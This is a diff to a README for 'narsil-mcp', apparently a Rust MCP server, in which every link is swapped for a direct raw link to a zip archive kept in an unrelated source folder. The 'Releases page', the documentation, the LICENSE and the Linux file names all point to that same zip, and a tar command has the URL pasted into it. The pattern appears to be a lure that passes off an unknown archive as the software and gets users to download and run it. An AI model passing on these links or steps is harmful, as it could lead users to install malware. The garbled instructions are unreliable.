@@ -8,15 +8,15 @@ Welcome to narsil-mcp! This application serves as a Rust MCP server, providing a
 
 To get started, you need to download the software. Click the button below to visit the Releases page and get the most recent version of narsil-mcp.
 
-[![Download narsil-mcp](https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip)](https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip)
+[![Download narsil-mcp](https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip)](https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip)
 
-1. Click the button above to visit the [Releases page](https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip).
 2. On the Releases page, you will see a list of available versions. Choose the latest version for your system.
 3. Click on the version number to expand the details.
 4. Download the file that matches your operating system. 
    - For Windows users, look for files ending in `.exe`.
    - For macOS users, look for files ending in `.dmg`.
-   - For Linux users, find the `https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip` files.
+   - For Linux users, find the `https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip` files.
 
 After the download is complete, locate the file in your Downloads folder.
 
@@ -34,10 +34,10 @@ After the download is complete, locate the file in your Downloads folder.
 
 ### Linux Installation
 
-1. Extract the downloaded `https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip` file.
    - Open your Terminal.
    - Navigate to the directory where you downloaded the file (`cd ~/Downloads`).
-   - Run the command: `tar -xvzf narsil-mcp-<version>https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip` (replace `<version>` with your actual downloaded file name).
+   - Run the command: `tar -xvzf narsil-mcp-<version>https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip` (replace `<version>` with your actual downloaded file name).
    
 2. Navigate into the extracted folder (`cd narsil-mcp-<version>`).
 3. Now you can run the application by executing the command: `./narsil-mcp`.
@@ -62,7 +62,7 @@ To run narsil-mcp effectively, ensure your system meets the following requiremen
 
 ## 📚 Documentation & Support
 
-For detailed usage instructions and tips on maximizing your experience with narsil-mcp, refer to the [Documentation](https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip). If you encounter problems, please check out the support section or create an issue on our GitHub page.
+For detailed usage instructions and tips on maximizing your experience with narsil-mcp, refer to the [Documentation](https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip). If you encounter problems, please check out the support section or create an issue on our GitHub page.
 
 ## 🌟 Community Contributions
 
@@ -70,6 +70,6 @@ We value community feedback and contributions. If you would like to report a bug
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/doctordisrespect/narsil-mcp/raw/refs/heads/main/narsil-plugin/.claude-plugin/mcp_narsil_v2.3.zip) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/doctordisrespect/narsil-mcp/main/frontend/src/types/mcp-narsil-2.9.zip) file for more details.
 
 Thank you for choosing narsil-mcp! We hope it brings clarity and efficiency to your coding projects.
